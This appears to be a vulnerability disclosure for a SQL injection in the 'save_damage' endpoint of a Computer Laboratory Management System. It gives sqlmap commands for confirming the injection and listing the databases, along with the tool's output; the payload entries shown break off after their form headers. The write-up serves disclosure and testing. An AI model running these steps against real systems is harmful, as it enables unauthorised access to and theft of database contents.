---
slug: computer-laboratory-management-system-save_damage
title: Computer Laboratory Management System (save_damage)
---

## Details

### Related Code file: 
`/lms/classes/Master.php?f=save_damage`

## Injection parameter: 
`MULTIPART id`

&nbsp;

## POC

![1](https://github.com/user-attachments/assets/f6328214-7f5f-4f9a-bf7e-447f21da9b39)

Intercept request using Burpsuite Proxy.

![2](https://github.com/user-attachments/assets/e57a2f8e-ad00-4f85-a138-e46ae2c417ce)

Save request to `save_damage.txt`.


### Verify vulnerability

```
sqlmap -r save_damage --batch
```

![56](https://github.com/user-attachments/assets/ed282c52-ee86-45c9-b642-90f84ac4e0e1)

![57](https://github.com/user-attachments/assets/22d1d8f0-52bf-4eb1-b532-c4511367b609)

![58](https://github.com/user-attachments/assets/c70653d7-f48d-4c3f-a926-fab65434e86c)

```
Parameter: MULTIPART id ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: -----------------------------20097612161463129383887948722
Content-Disposition: form-data; name="id"


    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: -----------------------------20097612161463129383887948722
Content-Disposition: form-data; name="id"


    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------20097612161463129383887948722
Content-Disposition: form-data; name="id"
```


### Dump databases

```
sqlmap -r save_damage --batch --dbs
```

![55](https://github.com/user-attachments/assets/0c842637-a434-4b7a-bb76-27dcc94cd0aa)

```
[03:05:19] [INFO] fetching database names
[03:05:19] [INFO] resumed: 'information_schema'
[03:05:19] [INFO] resumed: 'lms'
available databases [2]:
[*] information_schema
[*] lms
```
